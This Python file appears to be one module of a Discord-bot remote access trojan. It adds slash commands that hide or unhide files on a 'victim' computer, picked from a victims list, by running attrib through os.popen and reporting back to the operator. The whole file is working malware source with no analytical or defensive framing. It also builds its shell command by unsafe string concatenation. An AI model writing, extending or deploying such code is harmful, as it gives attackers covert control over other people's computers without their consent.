from disnake.ext import commands
from datetime import datetime

import os


class HideFile(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command()
    async def file_hide(self, ctx, victim, file):
        """Hide any file on victim's computer

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        file: File path of the file to be hidden.
        """
        if self.bot.valid(victim):
            if '"' in file:
                file = file.replace('"', "")

            output = os.popen("attrib +h " + '"' + file + '"').read()

            if "not" in output:
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        "Unable to hide file!",
                        datetime.now(),
                        "Ensure the file path is correct and try again",
                    )
                )

            await ctx.response.send_message(
                embed=self.bot.genEmbed(
                    "File hidden successfully!",
                    datetime.now(),
                    "Path:\n```" + file + "```",
                )
            )

    @commands.slash_command()
    async def file_unhide(self, ctx, victim, file):
        """Unhide hidden file on victim's computer

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        file: File path of the file to be unhidden.
        """
        if self.bot.valid(victim):
            if '"' in file:
                file = file.replace('"', "")

            output = os.popen("attrib -h " + '"' + file + '"').read()

            if "not" in output:
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        "Unable to show file!",
                        datetime.now(),
                        "Ensure the file path is correct and try again",
                    )
                )

            await ctx.response.send_message(
                embed=self.bot.genEmbed(
                    "File unhidden successfully!",
                    datetime.now(),
                    "Path:\n```" + file + "```",
                )
            )


def setup(bot: commands.Bot):
    bot.add_cog(HideFile(bot))
